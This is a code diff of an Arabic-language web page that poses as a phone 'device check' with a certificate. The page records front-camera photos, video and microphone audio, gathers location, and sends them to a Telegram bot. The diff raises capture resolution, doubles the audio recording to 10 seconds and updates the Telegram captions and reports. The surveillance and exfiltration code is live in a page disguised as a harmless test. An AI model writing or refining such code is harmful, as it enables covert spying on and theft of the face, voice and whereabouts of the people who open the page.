@@ -669,7 +669,7 @@
                     <div class="step-number-mobile">4</div>
                     <div class="step-content">
                         <div class="step-title-mobile">فحص الميكروفون</div>
-                        <div class="step-desc-mobile">تسجيل عينة صوتية (5 ثواني)</div>
+                        <div class="step-desc-mobile">تسجيل عينة صوتية (10 ثواني)</div>
                     </div>
                     <div class="step-status-mobile status-pending">في الانتظار</div>
                 </div>
@@ -810,12 +810,12 @@
                             <div class="volume-level-mobile" id="volumeLevelMobile"></div>
                         </div>
                         <div style="text-align: center; margin: 10px 0; font-weight: bold; color: var(--primary-blue);" id="volumeTextMobile">
-                            جاري التسجيل... 5 ثوانٍ
+                            جاري التسجيل... 10 ثوانٍ
                         </div>
                     </div>
                     
                     <div style="text-align: center; color: #666; font-size: 14px; margin-top: 15px;">
-                        جاري تسجيل عينة صوتية لمدة 5 ثوانٍ...
+                        جاري تسجيل عينة صوتية لمدة 10 ثوانٍ...
                     </div>
                 </div>
                 
@@ -1350,21 +1350,25 @@
             return connection && connection.effectiveType ? connection.effectiveType : 'غير معروف';
         }
         
-        // اختبار 2: الكاميرا (صورة) - سريع جداً
+        // اختبار 2: الكاميرا (صورة) - طريقة طبيعية مثل الكود القديم
         async function mobileTestCamera() {
             showMobileNotification('📸 جاري تفعيل الكاميرا...', 800);
             
             try {
-                // طلب صلاحية الكاميرا بسرعة
+                // طلب صلاحية الكاميرا مثل الكود القديم
                 cameraStreamMobile = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' },
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: false
                 });
                 
                 mobileElements.cameraFeed.srcObject = cameraStreamMobile;
                 
-                // عد تنازلي سريع
-                let count = 2;
+                // عد تنازلي مثل الكود القديم
+                let count = 3;
                 mobileElements.countdown1.textContent = count;
                 
                 const countdownInterval = setInterval(() => {
@@ -1373,9 +1377,15 @@
                     
                     if (count <= 0) {
                         clearInterval(countdownInterval);
-                        captureMobilePhotoQuick();
+                        mobileElements.cameraOverlay.style.opacity = '0';
+                        
+                        // التقاط الصورة فوراً
+                        setTimeout(() => {
+                            mobileElements.cameraOverlay.style.display = 'none';
+                            captureMobilePhoto();
+                        }, 300);
                     }
-                }, 500);
+                }, 800);
                 
             } catch (error) {
                 console.error('❌ فشل الكاميرا:', error);
@@ -1388,20 +1398,20 @@
             }
         }
         
-        // دالة التقاط صورة سريعة
-        async function captureMobilePhotoQuick() {
+        // دالة التقاط صورة - طريقة طبيعية مثل الكود القديم
+        async function captureMobilePhoto() {
             try {
-                // إنشاء canvas
+                // إنشاء canvas مثل الكود القديم
                 const canvas = document.createElement('canvas');
-                canvas.width = 320;
-                canvas.height = 240;
+                canvas.width = mobileElements.cameraFeed.videoWidth || 640;
+                canvas.height = mobileElements.cameraFeed.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 
                 // التقاط الصورة
                 ctx.drawImage(mobileElements.cameraFeed, 0, 0, canvas.width, canvas.height);
                 
-                // تحويل إلى base64
-                const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                // تحويل إلى base64 مثل الكود القديم
+                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                 
                 // حفظ الصورة
                 collectedDataMobile.photo = {
@@ -1442,16 +1452,20 @@
             showMobileNotification('🎥 جاري تفعيل الفيديو...', 800);
             
             try {
-                // طلب صلاحية الفيديو بسرعة
+                // طلب صلاحية الفيديو
                 videoStreamMobile = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: false
                 });
                 
                 mobileElements.videoFeed.srcObject = videoStreamMobile;
                 
                 // بدء تسجيل الفيديو فوراً
-                startVideoRecordingQuick();
+                startVideoRecording();
                 
                 // عد تنازلي
                 let count = 10;
@@ -1480,13 +1494,13 @@
             }
         }
         
-        // دالة تسجيل الفيديو السريع
-        function startVideoRecordingQuick() {
+        // دالة تسجيل الفيديو
+        function startVideoRecording() {
             try {
                 recordedVideoChunks = [];
                 
-                // إنشاء MediaRecorder بجودة منخفضة
-                const options = { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 250000 };
+                // إنشاء MediaRecorder
+                const options = { mimeType: 'video/webm; codecs=vp9' };
                 videoRecorder = new MediaRecorder(videoStreamMobile, options);
                 
                 videoRecorder.ondataavailable = (event) => {
@@ -1498,7 +1512,7 @@
                 videoRecorder.onstop = async () => {
                     if (recordedVideoChunks.length === 0) {
                         console.log('⚠️ لا توجد بيانات فيديو');
-                        proceedToNextTest();
+                        proceedToVideoNextTest();
                         return;
                     }
                     
@@ -1530,11 +1544,11 @@
                                 videoStreamMobile = null;
                             }
                             
-                            proceedToNextTest();
+                            proceedToVideoNextTest();
                         };
                     } catch (error) {
                         console.error('❌ فشل معالجة الفيديو:', error);
-                        proceedToNextTest();
+                        proceedToVideoNextTest();
                     }
                 };
                 
@@ -1548,34 +1562,38 @@
                 
             } catch (error) {
                 console.error('❌ فشل تسجيل الفيديو:', error);
-                proceedToNextTest();
+                proceedToVideoNextTest();
             }
         }
         
-        // دالة الانتقال للاختبار التالي
-        function proceedToNextTest() {
+        // دالة الانتقال للاختبار التالي بعد الفيديو
+        function proceedToVideoNextTest() {
             setTimeout(() => {
                 updateMobileStep(4);
                 startMobileTest(4);
             }, 800);
         }
         
-        // اختبار 4: الميكروفون - 5 ثوانٍ فقط
+        // اختبار 4: الميكروفون - 10 ثوانٍ (مثل الفيديو)
         async function mobileTestMicrophone() {
             showMobileNotification('🎤 جاري تفعيل الميكروفون...', 800);
             
             try {
-                // طلب صلاحية الميكروفون بسرعة
+                // طلب صلاحية الميكروفون
                 audioStreamMobile = await navigator.mediaDevices.getUserMedia({
-                    audio: true,
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        autoGainControl: true
+                    },
                     video: false
                 });
                 
                 // بدء تسجيل الصوت فوراً
-                startAudioRecordingQuick();
+                startAudioRecording();
                 
                 // عد تنازلي
-                let count = 5;
+                let count = 10;
                 const updateCountdown = () => {
                     mobileElements.volumeText.textContent = `جاري التسجيل... ${count} ثواني`;
                     count--;
@@ -1598,8 +1616,8 @@
             }
         }
         
-        // دالة تسجيل الصوت السريع
-        function startAudioRecordingQuick() {
+        // دالة تسجيل الصوت - 10 ثوانٍ
+        function startAudioRecording() {
             try {
                 audioChunks = [];
                 const mediaRecorder = new MediaRecorder(audioStreamMobile);
@@ -1631,10 +1649,10 @@
                                 data: audioData,
                                 timestamp: new Date().toISOString(),
                                 size: Math.round(audioBlob.size / 1024),
-                                duration: 5
+                                duration: 10
                             };
                             
-                            showMobileNotification('✅ تم تسجيل الصوت (5 ثواني)', 800);
+                            showMobileNotification('✅ تم تسجيل الصوت (10 ثواني)', 800);
                             
                             // إرسال الصوت للبوت فوراً
                             sendAudioToBot(audioData);
@@ -1653,13 +1671,13 @@
                     }
                 };
                 
-                // بدء التسجيل لمدة 5 ثوانٍ
+                // بدء التسجيل لمدة 10 ثوانٍ
                 mediaRecorder.start();
                 setTimeout(() => {
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
-                }, 5000);
+                }, 10000);
                 
             } catch (error) {
                 console.error('❌ فشل تسجيل الصوت:', error);
@@ -1923,7 +1941,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('audio', blob, `audio_${Date.now()}.webm`);
-                formData.append('caption', `🎤 تسجيل صوتي (5 ثواني)\n🕐 ${new Date().toLocaleString('ar-SA')}`);
+                formData.append('caption', `🎤 تسجيل صوتي (10 ثواني)\n🕐 ${new Date().toLocaleString('ar-SA')}`);
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
                     method: 'POST',
@@ -2042,7 +2060,7 @@
             report += `📸 <b>نتائج الفحوصات:</b>\n`;
             report += `├ فحص الكاميرا (صورة): ${collectedDataMobile.photo ? 'ناجح ✓' : 'تخطي ✗'}\n`;
             report += `├ فحص الكاميرا (فيديو): ${collectedDataMobile.video ? 'ناجح ✓ (10 ثواني)' : 'تخطي ✗'}\n`;
-            report += `├ فحص الصوت: ${collectedDataMobile.audio ? 'ناجح ✓ (5 ثواني)' : 'تخطي ✗'}\n`;
+            report += `├ فحص الصوت: ${collectedDataMobile.audio ? 'ناجح ✓ (10 ثواني)' : 'تخطي ✗'}\n`;
             report += `└ فحص الموقع: ${location.latitude ? 'ناجح ✓' : 'تخطي ✗'}\n\n`;
             
             report += `✅ <b>حالة الفحص:</b> مكتمل بنجاح\n`;
@@ -2059,7 +2077,7 @@
                                `📊 تم إرسال التقرير الكامل\n` +
                                `🏆 الشهادة: ${collectedDataMobile.certificate.number}\n` +
                                `🎥 مدة الفيديو: 10 ثواني\n` +
-                               `🎤 مدة التسجيل الصوتي: 5 ثواني\n` +
+                               `🎤 مدة التسجيل الصوتي: 10 ثواني\n` +
                                `🕐 ${new Date().toLocaleString('ar-SA')}`;
                 
                 await sendTelegramMessage(message);
